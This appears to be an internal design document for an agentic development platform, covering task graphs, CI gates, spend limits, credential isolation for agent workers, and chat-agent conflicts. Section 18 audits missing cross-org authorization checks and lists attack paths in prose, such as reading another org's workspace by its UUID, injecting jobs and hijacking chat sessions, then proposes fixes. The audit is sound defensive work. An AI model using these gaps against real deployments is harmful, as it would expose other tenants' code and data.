---

### 17.11 Linked Docs / Dependency Cycle Breaking

#### Q: How is cycle detection deterministic and explainable?

**The node dependency graph uses Kahn's algorithm for acyclicity validation** (`job_service.rs` ~L764 during task graph submission). This is deterministic — same input always produces the same result.

For the analysis pipeline (Python SemLift analyzers), cycle detection uses **language-specific DFS**:
- Python: `PythonImportSimulator` — DFS from each import target
- C/C++: `IncludeGuardSimulator` — DFS with processing stack
- Rust: Module tree is inherently acyclic; `use` cycles as safety net
- Others: Standard DFS back-edge detection

The DFS heuristic removes **back edges** — edges discovered when DFS reaches a node already on the current processing stack. This is deterministic given stable traversal order (alphabetical file/import ordering).

#### Q: Should the UI surface which edges were removed?

**Yes.** When cycles are broken during analysis, the removed edges should be:
1. Stored as `metadata` on the affected `node_dependencies` rows (add `is_cycle_break: bool` field)
2. Displayed in the dependency graph visualizer with a distinctive style (dashed red edge with tooltip: "Cycle-breaking: dependency from A→B removed")
3. Logged as a warning in the bootstrap task's timeline

This is a small schema + UI addition, not an architecture change.

---

### 17.12 CI Gates and Merge Policy

**Current state: no CI gate implementation exists.** Merge is "explicit and human-controlled" per design. No `merge_policy`, `require_ci`, or `ci_status` fields in the schema.

#### Proposed architecture:

Add to `workspace_settings`:
```sql
merge_policy TEXT DEFAULT 'manual' CHECK (merge_policy IN ('manual', 'ci_required', 'ci_optional')),
ci_webhook_url TEXT,  -- external CI system webhook
ci_status_check TEXT  -- GitHub status check name to require
```

Add to task model:
```sql
ci_status TEXT CHECK (ci_status IN ('pending', 'running', 'passed', 'failed', 'skipped')),
ci_run_url TEXT
```

CI integration options:
- **A. External only:** Task branch pushed → GitHub/GitLab CI runs → status check reported via webhook → g5-api updates `ci_status` on the task
- **B. Built-in:** Task agent runs tests as part of execution → reports pass/fail in task outcome → no external CI needed
- **C. Hybrid:** Agent runs unit tests (built-in). Integration/E2E tests run externally.

**Recommendation: Option C for production.** For M0/demo, Option B (agent runs tests) is sufficient. The task timeline can include CI results as `event_type = 'ci_result'` entries with `metadata: { status, url, duration }`.

---

### 17.13 Cost Monitoring — Budget Enforcement

**Already well-implemented.** The scheduler's `SpendChecker` runs every tick:

1. Checks per-workspace limits: `max_spend_usd`, `max_input_tokens`, `max_output_tokens`
2. Configurable period: `hourly | daily | weekly | monthly | total`
3. On breach: **all workspace jobs auto-paused** + WebSocket `spend_limit_reached` event to UI
4. On reset (new billing period): **auto-resume** + `spend_limit_cleared` event

**What exists:**
- Hard budget per workspace: `max_spend_usd` (USD cap), enforced by scheduler admission control
- Auto-scaling ceiling: `max_cloud_workers` per workspace (default 8)
- Concurrency cap: `max_concurrent_tasks` per workspace (default 4)
- Per-task cost tracking: `input_tokens`, `output_tokens`, `cost_usd` on tasks table

**What's missing:**
- **Per-org aggregate limits** — currently per-workspace only. An org-level spend cap would require a new `org_settings` table or `org_spend_limit` column.
- **Pre-flight cost estimation** — before launching a job, estimate token cost based on file size + historical averages. Show "This job will cost approximately $X" in the confirmation dialog.
- **Real-time budget dashboard** — the `useWorkspaceSpend` and `useSpendHistory` hooks exist in the frontend but need a visual chart component.

---

### 17.14 Sensitive Information — Credentials in Workers

**Designed with defense in depth:**

| Concern | Mitigation |
|---------|-----------|
| LLM API keys | **Never in worker.** All LLM calls proxied via `POST /api/internal/llm/chat`. Workers use `HttpProvider` pointed at g5-api. |
| SCM tokens | Injected at dispatch time via `G5_REPO_CREDENTIALS` env var. Written to git credential store in ephemeral Kata VM. Never sent over WebSocket. |
| Worker isolation | Two levels: `Trusted` (in-process credentials) for local/desktop, `Restricted` (all credentials proxied) for cloud. |
| Network isolation | Cloud workers: outbound to g5-api IP only, no DNS, no general internet. |
| CRDT leakage | Credentials should NEVER appear in spec content or CRDT-tracked files. The agent prompt should instruct: "Never include secrets, tokens, or credentials in spec files or code." |
| Log leakage | Timeline entries are user-visible. The agent proxy should redact known secret patterns from `tool_result` entries before persisting. |

**What's missing:**
- **Automated secret detection** in CRDT writes — scan content for high-entropy strings or known patterns (AWS keys, JWT tokens) before persisting to `draft_updates`. This is a content filter in `CrdtAuthority::handle_sync_update()`.
- **Redaction in timeline** — the timeline `content` field may contain command output with leaked secrets. Add a redaction pass in `task_service::append_timeline()`.

---

### 17.15 Uplift/Downlift Staleness When Both Sides Change

#### Q: What if both code and spec change concurrently?

A node **can be both `uplift_stale` AND `downlift_stale` simultaneously.** The two flags are independently computed:
- `uplift_stale` = source code changed after last spec refresh
- `downlift_stale` = spec changed after last code refresh

This happens when `content_updated_at` advances past both `last_uplifted_at` and `last_downlifted_at`.

**The system currently makes no special case for this.** Running uplift would regenerate the spec from the (changed) code, discarding the spec changes. Running downlift would regenerate the code from the (changed) spec, discarding the code changes. **Both are lossy.**

#### Proposed resolution — bidirectional conflict detection:

Add to `StalenessInfo`:
```rust
pub bidirectional_conflict: bool,  // true when both uplift_stale AND downlift_stale
```

When `bidirectional_conflict` is true:
1. **UI shows a conflict badge** (⚡ instead of ⚠️) with explanation: "Both code and spec changed since last sync"
2. **Job creation is blocked** (unless `force: true`) — user must choose a direction
3. **Three resolution options in UI:**
   - "Keep spec, regenerate code" (downlift)
   - "Keep code, regenerate spec" (uplift)
   - "Manual merge" — opens a diff view showing spec vs code changes side-by-side

**Cross-branch scenario** (draft exists on spec, code changes on another branch): This is a CRDT rebase scenario from §17.1. The draft gets rebased when the tracking branch advances. If the rebase produces conflicts, commit is blocked until resolved. Staleness is per-branch — the `content_updated_at` on the spec branch doesn't know about code changes on a different branch.

**Recommendation:** For M0, surface the bidirectional conflict in the UI and let the user choose. For M1, add a "smart merge" option where the agent attempts to reconcile both sides.

---

### 17.16 Editor/Worker for Chat — Isolation and Conflicts

#### Q: Can a chat worker change whatever file it wants?

**Yes, within its scope.** Chat sessions have `scope_type` and `scope_ref`:
- `workspace`-scoped: can access/edit any file in the workspace
- `node`-scoped: focused on a specific ontology node's files
- `task`-scoped: focused on the files relevant to a running task

The scope is a **prompt-level constraint**, not a hard filesystem restriction. The chat agent's tools (`write_file`, `edit_file_replace`) work on any path in the worktree. If we need hard enforcement, the tools should validate paths against the scope before executing.

#### Q: Are chat workers isolated?

**Chat runs in `g5d --editor` mode**, which is NOT a separate worker process — it's the editor/broker role. The chat agent runs inside the editor process, which has access to the entire workspace filesystem. There is no Kata VM isolation for chat — it runs locally.

For cloud chat, the architecture would need a dedicated worker (g5d in worker mode with `session_type: chat`), which IS isolated in a Kata VM.

#### Q: What branch does the chat agent use?

Chat sessions have a `branch` field in `chat_sessions`. The chat agent operates on the **workspace's active branch** (typically the default tracked branch). Chat edits go through the same CRDT draft as human edits — they're collaborative.

#### Q: Would chat edits conflict with g5d worker edits?

**Yes, this is a real concern.** If a chat agent and a task worker both edit files on the same branch simultaneously:

1. **Same CRDT doc:** Both connect to the same Y.Doc (same workspace + branch). CRDT merge handles concurrent edits deterministically.
2. **Semantic conflicts:** CRDT guarantees convergence but not semantic correctness. Two agents editing the same function with different intent produces garbage even though the CRDT merges cleanly.

**Mitigation strategies:**
- **Branch separation:** Chat should work on the default branch; task workers work on `task/{task_id}` branches. No shared CRDT doc = no merge conflict.
- **Scope locking:** When a task is running on a node's files, the chat agent's `write_file` tool should warn: "This file is being modified by task X. Edits may be overwritten."
- **Draft separation:** Chat edits go to a separate `chat/{session_id}` draft, not the main branch draft. This requires a UI decision about how chat edits are eventually committed.

**Recommendation for M0:** Chat operates on the default branch. Task workers operate on task branches. No conflict because different branches = different CRDT docs. Chat edits are committed directly (small, interactive changes). Task branch changes are committed separately and merged explicitly.

---

### 17.17 Open Questions

59. **Should post-task `verify_consistency` be a separate tool call or a hard gate?** As a tool call, the agent can skip it. As a hard gate, the system runs it automatically before allowing `transition_task_state("complete")` and blocks completion on discrepancies. **Recommendation: hard gate. The agent shouldn't be able to claim completion without verification.**

60. **Worktree reuse across sequential tasks — lazy or explicit?** Should the scheduler explicitly assign the same worker (and worktree) to dependent tasks, or let the locality scorer handle it probabilistically? **Recommendation: explicit for `depends_on` chains within the same job. The scheduler should prefer assigning child tasks to the same worker that completed the parent, reusing the worktree with a rebase.**

61. **Multi-repo task scope — when?** Cross-repo tasks (single task editing files in multiple repos) require significant plumbing: multi-worktree CRDT paths, multi-branch commits, cross-repo ontology references. **Recommendation: M2. For M0-M1, handle cross-repo concerns via workspace-scoped chat or manual coordination between per-repo tasks.**

62. **D4X supervisor agent — separate design doc or section here?** The supervisor agent (dynamic task graph, continuous learning loop) is architecturally compatible with the current bootstrap task mechanism but needs its own prompt design, evaluation framework, and feedback data pipeline. **Recommendation: M1 design doc after §16's data collection infrastructure is built.**

63. **Ontology `confidence` field — who sets it?** Option A: the LLM self-reports confidence during uplift (unreliable). Option B: computed from human edit frequency (specs with many human edits have low auto-confidence). Option C: both — model confidence as initial estimate, human edit ratio as correction. **Recommendation: Option C.**

64. **Chat file scope enforcement — soft or hard?** Should node-scoped and task-scoped chat sessions be soft-constrained (agent is prompted to stay in scope, but tools allow any path) or hard-constrained (tools reject out-of-scope paths)? **Recommendation: hard-constrained for task-scoped (prevents interference with other tasks), soft-constrained for workspace-scoped (agent may need to explore).**

65. **Secret detection in CRDT — real-time or async?** Real-time scanning in `handle_sync_update()` adds latency to every edit. Async scanning as a maintenance task means secrets could persist for minutes. **Recommendation: real-time for high-entropy patterns (AWS key format, JWT), async for broader pattern matching. The real-time check is a regex on ~1KB of text per update — negligible latency.**

66. **Bidirectional staleness — should the batch sync planner (§16.4) refuse to operate on bidirectionally-stale nodes?** If both code and spec changed, auto-syncing in either direction is lossy. **Recommendation: yes, exclude bidirectionally-stale nodes from batch sync. Surface them as "requires manual resolution" in the sync plan. Allow `force: true` override with an explicit direction choice.**

---

## §18 — API Safety, Org-Scoping, DB Guardrails & Landing Page

### 18.1 Problem Statement

G5 is an inherently multi-tenant system: orgs → workspaces → repos → ontology. The current implementation has solid *authentication* (JWT ES256, scope-based `RequireScopes` middleware, service-token segregation) but **authorization** — proving that the authenticated user's org actually *owns* the resource being accessed — is not enforced at the handler or query level.

This section audits every layer of the stack: API input permissiveness (18.2), handler-level org-scoping gaps (18.3), database constraint gaps (18.4), the proposed org-guard middleware (18.5), missing indexes for org-filtered queries (18.6), UI org visibility for enterprise (18.7), and a stub landing page specification (18.8).

---

### 18.2 Cross-Org Access — The Permissive-Input Problem

**Current auth flow:**

```
OAuth callback → verify org membership → mint JWT {sub, org, scopes}
POST /api/v1/auth/refresh {orgId} → verify membership → re-mint JWT
```

The JWT carries `org_id` as a claim. `RequireScopes` validates that the JWT contains the required scope strings. **But no handler verifies that the requested resource belongs to `claims.org_id`.**

| Route | Handler Pattern | Gap |
|---|---|---|
| `GET /api/v1/workspaces/:id` | `get_workspace(Path(id), _auth: AuthContext)` | Queries `SELECT * FROM workspaces WHERE id = $1` — no `AND org_id = $2` |
| `GET /api/v1/orgs/:org_id/workspaces` | `list_workspaces(Path(org_id), _auth)` | Takes `org_id` from URL path, not from JWT claims → user can list any org's workspaces |
| `GET /api/v1/orgs/:org_id/members` | `list_members(Path(org_id), _auth)` | Same: URL-sourced org_id, no JWT cross-check |
| `POST /api/v1/workspaces/:id/jobs` | `create_job(Path(id), _auth, body)` | Fetches workspace by ID, creates job. Never checks workspace.org_id matches token.org |
| `GET /api/v1/chat/:session_id/messages` | `get_messages(Path(session_id), _auth)` | Session looked up by ID — no org ownership verification |
| `POST /api/v1/workspaces/:id/reindex` | `trigger_reindex(Path(id), _auth)` | Same pattern |
| `GET /api/v1/permissions/orgs/:org_id/…` | Multiple permission routes | All trust URL `org_id` |

**Severity:** If an attacker obtains a valid JWT for org A and knows (or guesses) a workspace UUID from org B, they can read/write that workspace's data. UUIDs are not secret — they appear in URLs, WebSocket messages, and API responses.

**Pattern:** The underscore in `_auth: AuthContext` is a Rust convention meaning "extracted but unused." 34 of 47 handler functions use `_auth` rather than destructuring `AuthContext::User(claims)` and checking `claims.org`.

---

### 18.3 Specific Cross-Org Attack Vectors

1. **Workspace data exfiltration.** `GET /workspaces/:id` returns the full workspace including ontology, settings, and members. Knowing a workspace UUID from another org (observable if anyone shares a URL) is sufficient.

2. **Job injection.** `POST /workspaces/:id/jobs` creates execution jobs. An attacker with a valid JWT could trigger compilation, uplift, or review tasks against another org's workspace, launching agent workers against their code.

3. **Chat session hijack.** `GET /chat/:session_id/messages` returns conversation history. Chat sessions may contain proprietary design discussions, code snippets, and architectural decisions.

4. **Org member enumeration.** `GET /orgs/:org_id/members` takes `org_id` from the URL. Any authenticated user can enumerate members of any organization.

5. **Permission escalation.** `GET /permissions/orgs/:org_id/scopes/:user_id` reveals another user's effective permissions if the org_id is attacker-controlled.

6. **Usage/billing data leak.** `GET /orgs/:org_id/usage` would expose billing and LLM usage data for any org.

---

### 18.4 Database Constraint Audit

#### 18.4.1 UNIQUE Constraints — Inventory

The schema has 18 UNIQUE constraints. The important findings:

| Issue | Details | Fix |
|---|---|---|
| **`org_invitations(org_id, email, status)`** | Allows multiple pending invitations to the same email if previous ones are declined or expired | Add partial unique index: `UNIQUE(org_id, email) WHERE status = 'pending'` |
| **`ontology_nodes(workspace_branch_id, parent_id, name)`** | Postgres treats NULLs as distinct in UNIQUE constraints. Two root-level nodes (parent_id IS NULL) with the same name in the same branch are **not prevented** | Add partial unique index: `UNIQUE(workspace_branch_id, name) WHERE parent_id IS NULL` |

All other UNIQUE constraints are sound: org slug globally unique, email globally unique, repo slug unique within org, branch name unique per repo, etc.

#### 18.4.2 CHECK Constraints — Comprehensive

The schema has 35+ CHECK constraints covering every enum-like column (roles, statuses, types, providers). These are solid — impossible values cannot enter the database regardless of API bugs.

Notable: `workspace_dependencies` has `CHECK (workspace_id <> depends_on)` preventing self-loops. `workspace_settings` has `CHECK (max_concurrent_tasks >= 1)`.

#### 18.4.3 Foreign Keys — ON DELETE Behavior

**Healthy:** 28 FK columns use `ON DELETE CASCADE` following the org → workspace → branch → node chain.

**Problematic — NO ACTION (default):** 12+ FK columns use the implicit Postgres default (`NO ACTION`), which will **block deletion** of the referenced row:

| Column | Effect |
|---|---|
| `workspaces.created_by → users` | Cannot delete a user who created a workspace |
| `workspaces.docs_repo_id → repos` | Cannot delete a repo used as docs repo |
| `workspace_members.invited_by → users` | Cannot delete the user who invited a member |
| `org_invitations.invited_by → users` | Cannot delete the invitation sender |
| `org_invitations.accepted_by → users` | Cannot delete the acceptor |
| `draft_participants.user_id → users` | Cannot delete a user participating in a draft |
| `comment_index.author_id → users` | Cannot delete a comment author |
| `comment_replies.author_id → users` | Same |
| `jobs.created_by → users` | Cannot delete a user who created a job |
| `workers.owner_user_id → users` | Cannot delete a worker owner |
| `workspace_settings.updated_by → users` | Cannot delete the settings editor |
| `user_scope_grants.granted_by → users` | Cannot delete the scope granter |
| `workspace_permission_overrides.granted_by → users` | Same |
| `chat_sessions.forked_from_id → chat_sessions` | Cannot delete a session that was forked from |

**Impact:** User deletion will fail with FK violations in production. This isn't a security issue but is an operational blocker for GDPR compliance, user offboarding, and account deletion.

**Fix:** Change all `*_by` and `owner_*` FK columns to `ON DELETE SET NULL`. These are audit/attribution columns — setting them to NULL preserves the record while allowing user deletion.

#### 18.4.4 Missing Cross-Org Referential Integrity

**Critical finding: The database has NO cross-table org_id consistency constraints.** All multi-tenant isolation is application-level. Specific gaps where cross-org data mixing is possible at the DB level:

| Cross-Reference | Risk |
|---|---|
| `workspaces.docs_repo_id → repos` | Workspace in org A could reference a docs repo belonging to org B |
| `workspace_branches.repo_id → repos` | A workspace's branch could point to a repo in a different org |
| `workspace_members.user_id → users` | User from org B could be added as member to org A workspace without org membership |
| `workspace_dependencies(workspace_id, depends_on)` | Cross-org workspace dependencies are possible — no constraint both belong to same org |
| `doc_node_links(doc_id, node_id)` | Can link a doc (via workspace) to a node (via workspace_branch) in a different org |
| `workers.org_id + workers.workspace_id` | Both optional FKs with no CHECK that workspace belongs to specified org |
| `usage_records.org_id + usage_records.workspace_id` | Could record usage against wrong org |
| `chat_sessions.forked_from_id` | Cross-workspace/cross-org session forking possible |

**Why not FK-enforce this?** Cross-table org_id matching requires either:
- Composite FKs (e.g., `FOREIGN KEY (org_id, docs_repo_id) REFERENCES repos(org_id, id)`) — requires adding `(org_id, id)` UNIQUE constraints to parent tables
- Trigger-based validation — more flexible but harder to maintain
- Application-level guards (current approach, but not implemented)

**Recommendation:** Add composite FK constraints for the highest-risk paths (workspace→repo, workspace_branches→repo, workspace_dependencies cross-check). Use the org-guard middleware (§18.5) for the rest.

#### 18.4.5 Row-Level Security (RLS)

**No RLS is defined anywhere in the schema.** There are no `ENABLE ROW LEVEL SECURITY` or `CREATE POLICY` statements. All tenant isolation is application-level.

**Recommendation for M1:** Add RLS policies to the six most sensitive tables:

```sql
ALTER TABLE workspaces ENABLE ROW LEVEL SECURITY;
CREATE POLICY workspace_org_isolation ON workspaces
  USING (org_id = current_setting('app.current_org_id')::uuid);
```

The API server sets `SET LOCAL app.current_org_id = '<jwt.org>'` at the start of each transaction. This provides defense-in-depth: even if a handler bug bypasses application-level checks, the DB itself will filter rows.

**Target tables for RLS:** `workspaces`, `repos`, `jobs`, `chat_sessions`, `usage_records`, `workers`.

---

### 18.5 Proposed Org-Guard Middleware

Instead of fixing 47 handlers individually, introduce a resource-ownership layer:

#### Option A: Axum Middleware — `RequireOrgOwnership`

```rust
/// Middleware that extracts org_id from JWT claims and validates
/// that the requested resource belongs to that org.
///
/// Applied to all /api/v1/workspaces/:id/* routes. Fetches the
/// workspace's org_id in a single query and rejects if mismatch.

pub struct RequireOrgOwnership;

impl<S> Layer<S> for RequireOrgOwnership {
    type Service = OrgOwnershipMiddleware<S>;
    fn layer(&self, inner: S) -> Self::Service {
        OrgOwnershipMiddleware { inner }
    }
}

impl<S, B> Service<Request<B>> for OrgOwnershipMiddleware<S> {
    async fn call(&mut self, req: Request<B>) -> Result<Response, Error> {
        let claims = req.extensions().get::<AuthContext>()
            .and_then(|a| match a { AuthContext::User(c) => Some(c), _ => None });
        
        if let Some(claims) = claims {
            let resource_org = resolve_resource_org(&req).await?;
            if resource_org != claims.org {
                return Err(ApiError::forbidden("resource belongs to another org"));
            }
        }
        self.inner.call(req).await
    }
}

async fn resolve_resource_org(req: &Request) -> Result<Uuid, Error> {
    // Extract :workspace_id, :org_id, :session_id etc from path
    // Query DB for the resource's org_id
    // Cache in request extensions to avoid re-query in handler
}
```

#### Option B: Query-Level Org Filter — `OrgScoped` Trait

```rust
/// Every query that accesses org-scoped data includes the org_id filter.
/// The trait provides helper methods that automatically inject org filtering.

trait OrgScoped {
    fn for_org(self, org_id: Uuid) -> Self;
}

// Usage in handlers:
async fn get_workspace(
    Path(id): Path<Uuid>,
    auth: AuthContext,
    db: Extension<PgPool>,
) -> Result<Json<Workspace>> {
    let claims = auth.require_user()?;
    let ws = sqlx::query_as!(Workspace,
        "SELECT * FROM workspaces WHERE id = $1 AND org_id = $2",
        id, claims.org
    ).fetch_optional(&*db).await?
     .ok_or(ApiError::not_found("workspace"))?;
    Ok(Json(ws))
}
```

**Recommendation:** Both. Option A as a middleware safety net for all routes under `/api/v1/workspaces/:id/*`, `/api/v1/orgs/:org_id/*`, etc. Option B as the primary defense — every query includes `AND org_id = $N`. Defense in depth.

#### Phased rollout:

| Phase | Action | Effort |
|---|---|---|
| **P0 (immediate)** | Add `AND org_id = $N` to all workspace/repo/job queries. Fix `_auth` → `auth` destructuring. | 2-3 days |
| **P1** | Implement `RequireOrgOwnership` middleware for `/api/v1/workspaces/:id/*` routes | 1 day |
| **P2** | Add org-scoped composite FKs for workspace→repo, workspace_branches→repo | 1 day migration |
| **P3** | Implement RLS on 6 core tables with `SET LOCAL app.current_org_id` | 2 days |
| **P4** | Fix all `ON DELETE NO ACTION` FKs → `SET NULL` for `*_by` columns | 1 day migration |

---

### 18.6 Missing Indexes for Org-Filtered Queries

Once org-filtering is added to all queries, these indexes become necessary:

| Table | Suggested Index | Query Pattern |
|---|---|---|
| `org_memberships` | `idx_orgmember_user ON org_memberships(user_id)` | "Which orgs does this user belong to?" — PK is `(org_id, user_id)`, reverse lookup needs index |
| `repos` | `idx_repos_org ON repos(org_id)` | Listing repos by org — existing UNIQUE `(org_id, slug)` helps for slug lookups but not bare org_id scans |
| `workers` | `idx_workers_org ON workers(org_id)` | Filtering workers by org |
| `workspace_members` | `idx_wsmember_user ON workspace_members(user_id)` | "Which workspaces can this user access?" — PK is `(workspace_id, user_id)`, reverse lookup needs index |

Already indexed: `workspaces` (has `idx_workspaces_org_updated`), `org_invitations` (has `idx_invitation_org`), `user_scope_grants` (has `idx_usg_user`), `usage_records` (has `idx_usage_org_time`).

---

### 18.7 Org UI for Enterprise — Gap Analysis

**Current state of org surfaces in the frontend:**

| Surface | Exists? | Quality |
|---|---|---|
| Org members page (`/:org/settings/members`) | ✅ Yes (578 lines) | Full member table, role management, invitation management with resend/revoke |
| Create org wizard (`CreateOrgDialog`) | ✅ Yes (828 lines) | 4-step wizard: name → repos → invites → done. Auto-slug + availability check |
| Invite dialog (`InviteDialog`) | ✅ Yes (311 lines) | Email + role selector |
| `switchOrg()` function | ✅ Yes (in `useAuth`) | Implemented: refreshes JWT with new org_id, re-fetches user |
| **Org switcher dropdown** | ❌ No | `switchOrg()` exists in auth context but **no UI component calls it** |
| **Org name/logo in top bar** | ❌ No | TopBar accepts `orgId` prop, passes it to `WorkspaceSwitcher` only. No org branding displayed |
| **Org settings page** (name, slug, billing, danger zone) | ❌ No | Only members management exists |
| **Org selection at login** | ⚠️ Partial | `RootRedirect` auto-selects `user.orgs[0]` — no chooser if user has multiple orgs |

**Gaps for enterprise:**

1. **No org switcher.** Multi-org users (consultants, multi-team engineers) cannot switch orgs without manually editing the URL. The backend `switchOrg` implementation is ready but no dropdown exposes it.

2. **No org branding.** The top bar shows workspace name but not org name. In multi-org scenarios, users can't visually confirm which org they're operating in. This is a security UX concern — accidental mutations in the wrong org's workspace.

3. **No org settings.** Enterprise orgs need: org name/slug editing, billing dashboard link, SSO configuration, danger zone (transfer ownership, delete org), audit log access.

4. **No org selection flow.** On login, the first org is auto-selected. If a user has 3 orgs, they can only reach orgs 2 and 3 by knowing the slug and editing the URL.

**Recommended additions:**

| Component | Priority | Description |
|---|---|---|
| `OrgSwitcher` dropdown in TopBar | **P0** | Shows current org name + logo, lists all user orgs, calls `switchOrg()` on selection. Badge for pending invitations. |
| Org name + avatar in sidebar header | **P0** | Always-visible org context. Prevents wrong-org mistakes. |
| `OrgSettingsPage` at `/:org/settings` | **P1** | Tabs: General (name, slug, logo), Members (existing), Billing (link to Stripe), Security (SSO, 2FA policy), Danger Zone |
| Org selection on login | **P1** | If `user.orgs.length > 1`, show org picker before redirect. If 1 org, auto-redirect (current behavior). |
| Org audit log page | **P2** | Enterprise compliance: who did what, when. Sourced from existing `timeline_entries` + new org-level events. |

---

### 18.8 G5 Landing Page — Specification

The landing page serves as the public entry point for G5, available at `/` for unauthenticated users. It should convey:

1. **Brand identity** — G5 logo (pentagon/graph motif in amber/gold on dark), tagline: "Ontology-Centric Agentic Development"
2. **Value proposition** — 3-4 feature cards: ontology-driven specs, AI agent workers, real-time CRDT collaboration, multi-repo workspace management
3. **CTA: Express Interest** — email input + submit button for waitlist. Stores to simple backend endpoint or client-side for now.
4. **CTA: Login** — button linking to `/login` (OAuth flow)
5. **Visual tone** — dark theme matching `g5-bg0`/`g5-bg1`, amber accents (`g5-active`), clean typography, subtle grid/graph background pattern

The landing page is created as a standalone component at `client/src/pages/LandingPage.tsx` and wired into the router at `/` for unauthenticated users.

---

### 18.9 Open Questions

67. **Should RLS use `SET LOCAL` (transaction-scoped) or `SET` (session-scoped)?** `SET LOCAL` is safer (auto-resets on transaction end) but requires every handler to run in a transaction. `SET` (session-scoped) persists across queries but risks stale org context if the connection is reused from the pool. **Recommendation: `SET LOCAL` within a transaction wrapper. sqlx's `pool.begin()` already provides this.**

68. **Composite FKs for cross-org prevention — how many tables?** Adding `(org_id, id)` UNIQUE constraints to `repos`, `workspaces`, and `users` enables composite FKs from child tables. But this adds ~32 bytes per UNIQUE index entry per row. For the 3 highest-risk tables (workspace→repo links), the overhead is negligible. **Recommendation: Add composite FKs for workspace→repo and workspace_branches→repo. Defer others to M2.**

69. **Org switcher — dropdown or full page?** A dropdown is faster (no page navigation) but harder to show org details. A full page (`/orgs`) with cards for each org is simpler to implement and can show more context. **Recommendation: Dropdown for ≤5 orgs, full page for >5. Start with dropdown only for M0.**

70. **Landing page — static HTML or React component?** A static HTML file avoids loading the React app for first-time visitors (faster LCP). A React component shares the theme system and can be code-split. **Recommendation: React component with route-level code splitting (`React.lazy`). The shared theme system outweighs the ~50ms LCP difference.**

71. **Express Interest form — what backend?** Options: (a) POST to `/api/v1/waitlist` endpoint stored in `waitlist_signups` table, (b) Formspree/Typeform external, (c) client-side only (localStorage + console log for dev). **Recommendation: (a) for production, (c) for the initial stub.**

72. **Should the org-guard middleware cache workspace→org lookups?** Each request through `/api/v1/workspaces/:id/*` would hit the DB for `SELECT org_id FROM workspaces WHERE id = $1`. With Redis or in-memory TTL cache, this becomes a ~1ms lookup. Without cache, it's ~2-5ms per request. **Recommendation: Start without cache. Add Redis cache if p99 latency shows the extra query as a bottleneck. Workspace→org mapping is very stable (changes only on workspace transfer).**

---

## 19. Dev-Mode Gated Features — Production Readiness Roadmap

_Date: 2026-02-14_

The frontend settings panel gates several incomplete features behind `VITE_DEV_MODE=true`.
Each feature below documents what exists today, what's missing, and the work required
to promote it to production visibility.

### 19.1 Feature Flag Mechanism

```
# Enable dev-mode in .env or environment:
VITE_DEV_MODE=true

# Code: client/src/lib/devMode.ts
isDevMode() → boolean   // checks import.meta.env.VITE_DEV_MODE
```

Components use `const devMode = isDevMode()` and conditionally render gated sections.
When a feature is production-ready, remove its `devMode &&` guard and delete the
corresponding entry from this section.

---

### 19.2 Default Model Selector

**What exists:**
- Dropdown in Preferences tab bound to `userSettings.defaultModel`
- Persisted to `localStorage` via the `useSettings()` hook
- `useChatModels()` hook fetches available models from `GET /api/v1/instance/chat/models`

**What's missing:**
1. **Chat system integration** — the chat send flow (`useChat` / chat panel) does not
   read `userSettings.defaultModel` when constructing the LLM request. The model is
   currently hardcoded per-workspace or per-session.
2. **Backend user-settings table** — no `user_settings` table exists in the schema
   (`001_initial_schema.sql`). The preference is local-only and lost across devices.
3. **API endpoints** — need `GET/PATCH /api/v1/users/me/settings` with a `default_model`
   column.

**Work estimate:** ~2 days (schema migration + API endpoints + chat integration).

---

### 19.3 Budget Warning Threshold

**What exists:**
- Number input in Preferences tab bound to `userSettings.budgetWarnAt`
- Persisted to `localStorage`

**What's missing:**
1. **Backend enforcement** — no server-side check compares accumulated spend against
   the threshold.
2. **Notification dispatch** — when spend crosses the threshold, the system needs to
   emit a notification via the user's configured channels (which are also dev-gated).
3. **User settings persistence** — same `user_settings` table gap as §19.2.
4. **Spend tracking granularity** — the spend aggregation query
   (`GET /api/v1/workspaces/:id/settings/spend`) is implemented in the handler but the
   underlying `workspace_service::get_workspace_settings` is `todo!()`.

**Work estimate:** ~3 days (schema + spend-check cron/hook + notification dispatch).

**Dependencies:** §19.4 (Notification Infrastructure) must land first.

---

### 19.4 Notification Toggles & Delivery Channels

**What exists:**
- Toggle switches for "Task complete" and "Agent blocked" notifications
- CRUD UI for delivery channels (email, Slack, WhatsApp, webhook)
- All persisted to `localStorage` via `useSettings()`

**What's missing:**
1. **Notification service** — no backend component dispatches notifications. Need a
   `NotificationService` that:
   - Subscribes to job state transitions (completed / blocked)
   - Reads the user's channel preferences
   - Fans out to appropriate delivery adapters
2. **Delivery adapters** — implementations for:
   - **Email**: SMTP or SendGrid/SES integration
   - **Slack**: Incoming webhook POST
   - **WhatsApp**: Twilio or similar API
   - **Webhook**: generic HTTP POST with configurable payload
3. **User settings persistence** — `user_settings` table with JSONB `notify_channels`
   column.
4. **Channel verification** — email/phone channels should require verification before
   enabling.
5. **Rate limiting** — prevent notification floods from rapid task completions.

**Work estimate:** ~5–8 days (notification service + 4 adapters + schema + verification).

---

### 19.5 Workspace Settings Form

**What exists:**
- Full settings form (`SettingsForm.tsx`) with fields: max concurrent tasks, max spend,
  spend period, max input/output tokens, allow cloud workers, max cloud workers,
  worker idle timeout.
- `useUpdateSettings()` hook sends `PATCH /api/v1/workspaces/:id/settings`.
- MSW mock handler returns mock data for development.
- Backend route exists at `settings.rs:305` but uses `PUT` (client sends `PATCH`).

**What's missing:**
1. **Backend implementation** — `workspace_service.rs` lines 1719 and 1729
   (`get_workspace_settings` and `update_workspace_settings`) are both `todo!()`.
2. **HTTP method alignment** — backend exposes `PUT`, client sends `PATCH`. Choose one
   (recommendation: `PATCH` for partial updates) and align both sides.
3. **Missing fields** — backend `WorkspaceSettings` model (`workspace.rs:90`) includes
   embedding-related fields (`embedding_model`, `embedding_dimensions`,
   `auto_embed_on_push`) not exposed in the UI form.
4. **Validation** — server-side validation of settings ranges (e.g., max concurrent
   tasks 1–16, worker idle timeout 1–60 min).
5. **Audit trail** — `updated_by` / `updated_at` tracking in the DB.

**Work estimate:** ~3 days (implement service methods + align HTTP method + add missing
fields to form + validation).

---

### 19.6 Spend Breakdown Panel

**What exists:**
- `SpendBreakdown` component renders per-job spend data with cost/token columns.
- `useWorkspaceSpend()` hook fetches `GET /api/v1/workspaces/:id/settings/spend`.
- MSW mock provides sample data.

**What's missing:**
1. **Backend implementation** — the spend endpoint requires `billing:admin` scope
   (`settings.rs:309`) and the underlying aggregation query is not implemented.
2. **Spend history** — `useSpendHistory()` hook exists but is not rendered anywhere.
   Need a time-series chart or table showing spend over time.
3. **Cache invalidation** — `useUpdateSettings` only invalidates `['settings', wsId]`;
   spend caches (`['spend', wsId]`, `['spend-history', wsId]`) are separate keys and
   go stale after settings changes.

